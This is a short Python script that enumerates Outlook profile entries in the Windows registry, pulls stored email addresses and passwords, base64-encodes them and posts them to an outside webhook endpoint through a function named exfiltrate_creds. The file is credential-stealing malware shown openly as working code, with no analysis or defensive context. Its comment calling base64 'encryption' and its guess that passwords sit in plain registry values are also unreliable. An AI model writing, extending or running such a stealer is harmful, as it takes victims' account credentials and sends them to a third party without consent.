import os
import winreg
import json
import base64
import requests

def get_outlook_credentials():
    # Windows registry for stored creds; adapt for other OS
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Office\16.0\Outlook\Profiles")
    creds = []
    i = 0
    while True:
        try:
            subkey = winreg.EnumKey(key, i)
            subkey_path = r"Software\Microsoft\Office\16.0\Outlook\Profiles\\" + subkey
            subkey_handle = winreg.OpenKey(winreg.HKEY_CURRENT_USER, subkey_path)
            email, _ = winreg.QueryValueEx(subkey_handle, "Email")
            password, _ = winreg.QueryValueEx(subkey_handle, "Password")  # Assuming stored
            creds.append({"email": email, "pass": password})
            i += 1
        except OSError:
            break
    return creds

def exfiltrate_creds(creds: list):
    data = json.dumps({"type": "outlook_creds", "creds": creds})
    encrypted = base64.b64encode(data.encode()).decode()
    requests.post("https://hook.vercel.app/api/hook", json={"data": encrypted})

if __name__ == "__main__":
    creds = get_outlook_credentials()
    if creds:
        exfiltrate_creds(creds)
